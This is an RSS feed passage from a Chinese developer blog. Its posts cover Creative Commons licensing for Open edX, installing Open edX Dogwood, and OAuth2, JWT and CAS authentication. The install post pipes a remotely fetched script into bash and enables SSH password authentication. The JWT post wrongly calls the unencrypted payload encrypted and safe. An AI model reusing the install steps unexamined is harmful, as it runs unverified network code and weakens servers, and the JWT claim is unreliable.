&lt;p&gt;大致是说Open edX 在它们的内容中增加了&lt;code&gt;知识共享许可协议&lt;/code&gt;（Creative Commons licensing），他们（Creative Commons）给奥巴马政府发了一封公开信，呼吁采取行政手段来保障教育资料对公众开放。&lt;/p&gt;
&lt;h1&gt;我的理解&lt;/h1&gt;
&lt;p&gt;Open edX的出现，为开放教育提供了技术支持。同历史上的大多事件一样，技术的成熟往往只是个开始，接下来更深刻的变革来自制度/协议/契约的建立，这些属于社会层面的活动。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;知识共享许可协议&lt;/code&gt;试图建立一种协议，为教育资源的开放保驾护航&lt;/p&gt;
&lt;p&gt;如果把Open edX比作Linux操作系统，那么知识共享许可协议就类似当年的GNU协议。&lt;/p&gt;
&lt;p&gt;当然他们都只是工具，还不涉及内容本身，虽然必定影响内容的表达。&lt;/p&gt;
&lt;p&gt;他们提供了类似脚手架的东西。在此基础上，那些对教育资源持开放态度且期待对教育进行变革的人们，起步要容易许多。&lt;/p&gt;
&lt;p&gt;我相信开源运动的核心是Richard Stallman（RMS）建立了开源哲学，并构建了强有力的GUN协议，使其与传统的专利法抗争，以此来保障自由。&lt;/p&gt;
&lt;p&gt;在这个层面上我相信知识共享许可协议（Creative Commons Licensing）是一个比Open edX本身重大的东西。而且可能重大得多。&lt;/p&gt;
&lt;p&gt;如果将来开放教育在教育领域引起了变革，正如今天开源运动之于软件领域。也许那时候Open edX已经形成生态，类似今天的Linux。但我依然相信&lt;code&gt;知识共享许可协议&lt;/code&gt;是促成变革的核心要素&lt;/p&gt;
&lt;h1&gt;可能性&lt;/h1&gt;
&lt;p&gt;我对内容的传播/扩散与改良十分感兴趣，这种传播过程很像生活进化进程中基因的活动。&lt;/p&gt;
&lt;p&gt;我对进化论视角的偏好，可能是受道金斯《自私的基因》的影响，在这本书里作者论述了，基因为了达到扩散自身的目的,"采取"的种种策略，令人叹为观止，后半部分作者进一步论述了与基因属性极其相似的东西迷因（meme），也就是我们日常所说的文化，他们的传播机制&lt;/p&gt;
&lt;p&gt;而作为知识载体的教育资源，我觉得适合看做文化的一个片段。&lt;code&gt;知识共享许可协议&lt;/code&gt;很像是为他们创造的外部环境，在此环境下的生物形态（教育资源）将可能具有以下特征：他们的进化更加频繁，互动更为紧密, 对环境的适应更好。他们进化出更优良的特性，最后被选择下来&lt;/p&gt;
&lt;p&gt;正如开源协议为软件协作解除了枷锁，这个协议可能为开放教育解除束缚&lt;/p&gt;
&lt;p&gt;最后把我在Open edX开发研究群里的讨论也放到这里，做个归档：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个协议被采用的话，可能内容就像开源软件一样可被不同的人迭代改良&lt;/p&gt;
&lt;p&gt;而edx成为类似linux的东西，基于此平台的课程就行基于Linux/Unix的开源软件，可以被任意更改优化，分布式地来改良&lt;/p&gt;
&lt;p&gt;如果顺利，这多像linux和开源运动的历史，不过是教育界的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;相关资料&lt;/h1&gt;
&lt;p&gt;我相信这是一件让人热血沸腾的变革，虽然它才蹒跚学步。&lt;/p&gt;
&lt;p&gt;给对此感兴趣的小伙伴列出我所收集到的相关资源&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://creativecommons.org/licenses/?lang=zh"&gt;关于许可协议&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://open.edx.org/features/creative-commons-licensing-courses-and-videos"&gt;Creative Commons Licensing for Courses and Videos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://open.edx.org/blog/open-edx-releases-creative-commons-licensing"&gt;Open edX Releases Creative Commons Licensing!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/configuration/enable_licensing.html"&gt;Enabling Course and Video Licensing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 07 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-07:about-creative-commons.html</guid><category>edx</category></item><item><title>在ubuntu12.04下安装edx Dogwood</title><link>/install-edx-Dogwood.html</link><description>&lt;h1&gt;Dogwood&lt;/h1&gt;
&lt;p&gt;Dogwood是Open edX的第四个稳定版本，该版本相关的特性可以参考@MT的&lt;a href="http://edustack.org/2016/01/03/open-edx-dogwood%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7/"&gt;Open edX DogWood版本特性&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前Dogwood还是rc版，估计要本月中旬才会有最终稳定版&lt;/p&gt;
&lt;h1&gt;最简易的方式&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;OPENEDX_RELEASE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;named-release/dogwood.rc
wget https://raw.githubusercontent.com/edx/configuration/&lt;span class="nv"&gt;$OPENEDX_RELEASE&lt;/span&gt;/util/install/sandbox.sh -O - &lt;span class="p"&gt;|&lt;/span&gt; bash
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;分步安装&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;sudo apt-get update -y&lt;/li&gt;
&lt;li&gt;sudo apt-get upgrade -y&lt;/li&gt;
&lt;li&gt;sudo reboot&lt;/li&gt;
&lt;li&gt;sudo apt-get install -y build-essential software-properties-common python-software-properties curl git-core libxml2-dev libxslt1-dev libfreetype6-dev python-pip python-apt python-dev libxmlsec1-dev swig&lt;/li&gt;
&lt;li&gt;sudo pip install --upgrade pip&lt;/li&gt;
&lt;li&gt;sudo pip install --upgrade virtualenv&lt;/li&gt;
&lt;li&gt;cd /var/tmp&lt;/li&gt;
&lt;li&gt;git clone https://github.com/edx/configuration&lt;/li&gt;
&lt;li&gt;cd /var/tmp/configuration&lt;/li&gt;
&lt;li&gt;git checkout named-release/dogwood.rc&lt;/li&gt;
&lt;li&gt;sed  -i "/COMMON_SSH_PASSWORD_AUTH/c COMMON_SSH_PASSWORD_AUTH: \"yes\"" playbooks/roles/common/defaults/main.yml&lt;/li&gt;
&lt;li&gt;sudo pip install -r requirements.txt&lt;/li&gt;
&lt;li&gt;cd /var/tmp/configuration/playbooks&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo ansible-playbook -c local ./edx_sandbox.yml -i  "localhost," -e 'edx_platform_version=named-release/dogwood.rc certs_version=named-release/dogwood.rc forum_version=named-release/dogwood.rc xqueue_version=named-release/dogwood.rc'&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;问题与解决方法&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;pkg_resources.DistributionNotFound: paramiko&lt;ul&gt;
&lt;li&gt;解决方法：&lt;code&gt;sudo pip install -U setuptools&lt;/code&gt;     &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;mysql_config not found&lt;ul&gt;
&lt;li&gt;解决方法: &lt;code&gt;sudo apt-get install libmysqlclient-dev&lt;/code&gt;      &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;青云&lt;/h1&gt;
&lt;p&gt;如果在青云上安装：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;vim /etc/default/grub
change &amp;quot;apparmor=1&amp;quot;
sudo update-grub
reboot
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 07 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-07:install-edx-Dogwood.html</guid><category>edx</category></item><item><title>OAuth学习笔记</title><link>/OAuth2-note.html</link><description>&lt;p&gt;既然最近在学习身份认证相关的东西，OAuth2就是一个绕不开的部分了&lt;/p&gt;
&lt;p&gt;OAuth致力于解决的是&lt;code&gt;授权&lt;/code&gt;相关的问题。它和认证并不相同。&lt;/p&gt;
&lt;p&gt;OAuth致力于为跨站的授权提供解决方案，而OpenID则是为了解决跨站点认证问题，当然这两个协议有重叠处，授权和认证常常关系紧密&lt;/p&gt;
&lt;p&gt;当前流行的OAuth版本是OAuth2.0，就是著名的OAuth2&lt;/p&gt;
&lt;h1&gt;介绍&lt;/h1&gt;
&lt;p&gt;维基上描述说，OAuth（&lt;code&gt;开放授权&lt;/code&gt;）是一个开放标准，允许用户让第三方应用访问该用户在某一网站上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。&lt;/p&gt;
&lt;p&gt;OAuth允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一个令牌授权一个特定的网站（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。这样，OAuth让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容。&lt;/p&gt;
&lt;h1&gt;意义&lt;/h1&gt;
&lt;p&gt;关于OAuth能给你带来什么好处，课程格子的创始人李天放在知乎有一段很棒的回答，我摘过来：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;新浪微博就是你的家。偶尔你会想让一些人（第三方应用）去你的家里帮你做一些事，或取点东西。你可以复制一把钥匙（用户名和密码）给他们，但这里有三个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;别人拿了钥匙后可以去所有的房间  &lt;/li&gt;
&lt;li&gt;别人拿到你的钥匙后也许会不小心丢到，甚至故意送到它人手里。这样你都不知到谁有你家钥匙。  &lt;/li&gt;
&lt;li&gt;过一段时间你也许会想要回自己的钥匙，但别人不还怎么办？   &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;OAuth 是高级钥匙: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你可以配置不同权限的钥匙。有些只能进大厅（读取你的微博流）。有些钥匙可以进储藏柜（读取你的相片)&lt;/li&gt;
&lt;li&gt;钥匙上带着指纹验证的（指纹 = appkey)。 收到钥匙的人只能自己用，不能转让 &lt;/li&gt;
&lt;li&gt;你可以远程废除之前发出的钥匙相对来说, OAuth比给出用户名密码安全&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相对来说, OAuth比给出用户名密码安全&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我觉得以上的回答简介形象又切中要害&lt;/p&gt;
&lt;h1&gt;原理&lt;/h1&gt;
&lt;p&gt;关于入门引导和原理介绍，阮一峰老师的博客一直是极好的学习之处，关于OAuth部分，他的博客依然精彩，我在文后给出了链接。在此引述一些关键内容&lt;/p&gt;
&lt;h3&gt;相关名词&lt;/h3&gt;
&lt;p&gt;我们先把名词定义理清楚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Resource Owner(RO)：资源所有者&lt;/li&gt;
&lt;li&gt;Authorization Server(AS)：认证服务器，即服务提供商专门用来处理认证的服务器。&lt;/li&gt;
&lt;li&gt;Resource Server(RS)：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;基本思路&lt;/h3&gt;
&lt;p&gt;OAuth在"客户端"与"服务提供商"之间，设置了一个授权层（authorization layer）。"客户端"不能直接登录"服务提供商"，只能登录授权层，以此将用户与客户端区分开来。"客户端"登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。&lt;/p&gt;
&lt;p&gt;"客户端"登录授权层以后，"服务提供商"根据令牌的权限范围和有效期，向"客户端"开放用户储存的资料。&lt;/p&gt;
&lt;h1&gt;客户端获取授权的四种模式&lt;/h1&gt;
&lt;p&gt;客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0定义了四种授权方式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;授权码模式（authorization code）&lt;/li&gt;
&lt;li&gt;简化模式（implicit）&lt;/li&gt;
&lt;li&gt;密码模式（resource owner password credentials）&lt;/li&gt;
&lt;li&gt;客户端模式（client credentials）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;授权码模式&lt;/h3&gt;
&lt;p&gt;授权码模式（authorization code）是功能最完整、流程最严密的授权模式，也是我们最长见到的那种模式，当我们使用开放api的时候&lt;/p&gt;
&lt;p&gt;步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户访问客户端，后者将前者导向认证服务器。&lt;/li&gt;
&lt;li&gt;用户选择是否给予客户端授权。&lt;/li&gt;
&lt;li&gt;假设用户给予授权，认证服务器将用户导向客户端事先指定的"重定向URI"（redirection URI），同时附上一个授权码。&lt;/li&gt;
&lt;li&gt;客户端收到授权码，附上早先的"重定向URI"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。&lt;/li&gt;
&lt;li&gt;认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;更多细节可以阅读阮一峰老师的原文&lt;/p&gt;
&lt;h3&gt;客户端模式&lt;/h3&gt;
&lt;p&gt;在这种模式中，用户直接向客户端注册，客户端以自己的名义要求"服务提供商"提供服务&lt;/p&gt;
&lt;p&gt;步骤为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端向认证服务器进行身份认证，并要求一个访问令牌。&lt;/li&gt;
&lt;li&gt;认证服务器确认无误后，向客户端提供访问令牌。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;之所以特意列出这种模式是因为之前为Open edX写微信后端，微信后端是一个独立的web app，采用Flask来写，由于edx信任这个应用，所以采用这种模式&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;h2&gt;refresh_token&lt;/h2&gt;
&lt;p&gt;之前在给Open edX写微信后端时，access_token过期的问题困扰了我很久，由于对OAuth还不够了解，我一拍脑袋重造了车轮来处理过期问题。&lt;/p&gt;
&lt;p&gt;豆瓣的&lt;a href="https://developers.douban.com/wiki/?title=oauth2"&gt;这篇文档&lt;/a&gt;很清楚地说明了access_token 有效期 与 refresh_token相关的问题&lt;/p&gt;
&lt;p&gt;如果access_token过期，根据服务端返回的标识（106错误：&lt;code&gt;access_token_has_expired&lt;/code&gt;）,此时既可以再次引导用户进行授权来获取 access_token，还可以通过 refresh_token 的方式来换取新的 access_token 和 refresh_token。&lt;/p&gt;
&lt;p&gt;refresh_token 只有在 access_token 过期时才能使用，并且只能使用一次。当换取到的 access_token 再次过期时，使用新的 refresh_token 来换取 access_token&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-cn/OAuth"&gt;OAuth 维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://oauth.net/2/"&gt;OAuth 2.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html"&gt;理解OAuth 2.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/seccloud/article/details/8192707"&gt;帮你深入理解OAuth2.0协议&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 29 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-29:OAuth2-note.html</guid><category>edx</category></item><item><title>JWT学习笔记</title><link>/jwt-note.html</link><description>&lt;p&gt;最近的这几篇文章都与身份认证有关，前边我们说到的CAS只是实现单点登录(SSO)的一种方式，本文将提到的JWT（JSON Web Token）是当前最流行的身份认证方式之一,也能实现单点登录。&lt;/p&gt;
&lt;h1&gt;基于Cookie/服务端的认证&lt;/h1&gt;
&lt;p&gt;身份认证是Web应用中极重要的一个部分，Cookie和基于服务器的身份验证（Session）一直都是最简单而常见的解决方案&lt;/p&gt;
&lt;p&gt;在传统的基于Cookie/服务端方案中,用户的每个请求中携带Cookie，服务端据此识别用户。&lt;/p&gt;
&lt;p&gt;这种方式可能存在很多问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它在跨域场景表现并不好&lt;/li&gt;
&lt;li&gt;很难提供对移动端的支持&lt;/li&gt;
&lt;li&gt;存在跨站点脚本攻击（XSS）的风险&lt;/li&gt;
&lt;li&gt;很难在两个使用不同语言编写的web框架间共享session数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;基于Token的认证&lt;/h1&gt;
&lt;p&gt;在API被广泛使用的今天（广泛到不少应用后端仅需提供API就好了），为API设计更合适的身份认证解决方案就变得十分必要，OAuth 2.0和JSON Web Token（JWT）是这些解决方案中最流行的&lt;/p&gt;
&lt;p&gt;基于Token的认证，除了能回避Cookie存在的问题，还有许多额外的优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无状态：由于Token已经自包含了所有的用户信息，所以无须再存储Session， 服务端易于扩展。&lt;/li&gt;
&lt;li&gt;内容分发：易于实现CDN，将静态资源分布到CDN上，某些CDN服务商提供了基于Token验证的安全服务，服务器仅提供API&lt;/li&gt;
&lt;li&gt;解耦：无须被绑定在一个特定的验证方案。作为独立的会话系统，利于实现分布式&lt;/li&gt;
&lt;li&gt;基于标准：JWT作为Token的标准已经被广泛的接受。主流语言都有相应支持JWT标准的工具包&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;JWT&lt;/h1&gt;
&lt;h3&gt;组成&lt;/h3&gt;
&lt;p&gt;JWT是一个轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。规范的细节参考&lt;a href="https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32"&gt;jwt规范&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一个JWT实际上就是一个字符串,看起来大概是这样的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;JWT是一段被base64url编码过的字符序列（去除了尾部的“=”），并用点号分隔。它由三部分组成，头部(Header)、载荷(Payload)与签名(Signature)。&lt;/p&gt;
&lt;h3&gt;Header&lt;/h3&gt;
&lt;p&gt;Header 包含了一些元数据，至少会表明 token 类型以及 签名方法。比如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;quot;typ&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;JWT&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;quot;alg&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HS256&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;type&lt;/code&gt;: 必需。token 类型，JWT 表示是 JSON Web Token.
&lt;code&gt;alg&lt;/code&gt;: 必需。token 所使用的签名算法，可用的值在&lt;a href="http://tools.ietf.org/html/rfc7518#section-3.1"&gt;这里&lt;/a&gt;有规定。&lt;/p&gt;
&lt;h3&gt;Payload&lt;/h3&gt;
&lt;p&gt;Payload部分包含了一些跟这个 token 有关的重要信息。 JWT 标准规定了一些字段，节选一些:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;iss&lt;/code&gt;: The issuer of the token，token 是给谁的&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sub&lt;/code&gt;: The subject of the token，token 主题&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exp&lt;/code&gt;: Expiration Time。 token 过期时间，Unix 时间戳格式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;iat&lt;/code&gt;: Issued At。 token 创建时间， Unix 时间戳格式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;jti&lt;/code&gt;: JWT ID。针对当前 token 的唯一标识&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了规定的字段外，可以包含其他任何 JSON 兼容的字段。&lt;/p&gt;
&lt;p&gt;Payload 示例:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;iss&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;example.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;exp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1435055117&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bar&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Payload加密后是安全可信的，所以我们可以将JWT设计为自说明、无状态的！&lt;/p&gt;
&lt;h3&gt;Signature&lt;/h3&gt;
&lt;p&gt;签名主要用于验证 token 是否有效，是否被篡改。 签名时可以加密算法进行签名，比如 HMAC SHA-256:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64url_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Header&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base64url_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hmacsha256&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;默认情况下Payload的内容并没有被加密,可以通过 base64url_decode(text) 的方式解码得到.如果要包含敏感信息的话，记得先将 Payload 的内容进行加密.&lt;/p&gt;
&lt;p&gt;可以使用&lt;code&gt;http://jwt.io&lt;/code&gt;来调试&lt;/p&gt;
&lt;h3&gt;安全性&lt;/h3&gt;
&lt;p&gt;上边说到默认情况下Payload的内容并没有被加密，所以你如果有加密需求，请使用pycrypto或是cryptography来加密。jwt的签名目的不是加密而是防止篡改.&lt;/p&gt;
&lt;h1&gt;demo&lt;/h1&gt;
&lt;h2&gt;pyjwt&lt;/h2&gt;
&lt;p&gt;我们来看一个Python实现的案例:&lt;a href="https://github.com/jpadilla/pyjwt"&gt;padilla/pyjwt&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; import jwt
&amp;gt;&amp;gt;&amp;gt; encoded = jwt.encode({&amp;#39;some&amp;#39;: &amp;#39;payload&amp;#39;}, &amp;#39;secret&amp;#39;, algorithm=&amp;#39;HS256&amp;#39;)
&amp;#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg&amp;#39;

&amp;gt;&amp;gt;&amp;gt; jwt.decode(encoded, &amp;#39;secret&amp;#39;, algorithms=[&amp;#39;HS256&amp;#39;])
{&amp;#39;some&amp;#39;: &amp;#39;payload&amp;#39;}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;从中我们可以发现，加解密的过程只在服务端发生（secret只有服务端存在），故而客户端拿到的是加密数据，其中携带的Payload是安全的，无法篡改。&lt;/p&gt;
&lt;h4&gt;Django实现&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://github.com/GetBlimp/django-rest-framework-jwt"&gt;django-rest-framework-jwt&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;附录：Base64&lt;/h1&gt;
&lt;p&gt;前边提到JWT使用base64来编码它的内容&lt;/p&gt;
&lt;p&gt;Base64是一种编码,并不是一种加密过程。&lt;/p&gt;
&lt;p&gt;关于Base64，维基百科已经说的很清楚了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Base64是一种基于64个可打印字符来表示二进制数据的表示方法,由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示...在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符&lt;/p&gt;
&lt;p&gt;Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email、在XML中存储复杂数据。&lt;/p&gt;
&lt;p&gt;编码后的数据比原始数据略长，为原来的4/3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;举个例子，编码&lt;code&gt;Man&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="base64.png" src="img/edx/auth/base64.png" /&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jwt.io/"&gt;jwt.io&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://codelife.me/blog/2014/03/26/token-based-authentication-and-claims-based-identity/"&gt;基于Token的认证和基于声明的标识&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mozillazg.com/2015/06/hello-jwt.html"&gt;JSON Web Token (JWT) 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/#disqus_thread"&gt;八幅漫画理解使用JSON Web Token设计单点登录系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jpadilla/pyjwt"&gt;jpadilla/pyjwt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 29 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-29:jwt-note.html</guid><category>edx</category></item><item><title>为什么CAS应该成为你的LMS的一部分</title><link>/use-CAS-in-your-LMS.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;这个标题是在呼应&lt;a href="http://edustack.org/"&gt;@MT&lt;/a&gt;的&lt;a href="http://edustack.org/2015/12/12/%E4%B8%BA%E4%BB%80%E4%B9%88lti%E5%BA%94%E8%AF%A5%E6%88%90%E4%B8%BA%E4%BD%A0%E7%9A%84elearning%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9F/"&gt;为什么LTI应该成为你的LMS的一部分？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://edustack.org/"&gt;@MT&lt;/a&gt;在上面这篇博文中写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个独立的开发商不可能提供所有的学校和组织需要的学习工具。因此，从不同开发商整合多种工具的能力对于学习系统来说变得必须。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;@MT对学习系统的见解，我一直十分佩服，每次交流，都受益匪浅。很喜欢上边的这句话，一个系统在架构设计的时候，如果考虑到日后与其他系统协作的可能，那么这种考虑会让它变得灵活许多.保持一种开放的心态，而不是试图自己实现所有的功能，臆想所有的场景，揣度用户心理与习惯。&lt;/p&gt;
&lt;p&gt;开放性与对协作的友好，也许正是应对变化的最佳策略，这也是我喜欢Unix/Linux的原因，当然也是我很喜欢Open edX的原因。&lt;/p&gt;
&lt;p&gt;让系统保持开放性，增强与外部系统交互的能力，十分有利于一个系统的长期运行，而不是因为外部的变化而迅速被淘汰。&lt;/p&gt;
&lt;h1&gt;回顾&lt;/h1&gt;
&lt;p&gt;我们在上篇文章（&lt;a href="http://blog.just4fun.site/educational-information-information-island-authentication.html"&gt;教育信息化、信息孤岛与身份认证&lt;/a&gt;）里提到,CAS对于整合异构系统是有意义的，它解决了统一身份认证的问题，让用户在异构系统中穿梭感觉不到，一致性体验很好&lt;/p&gt;
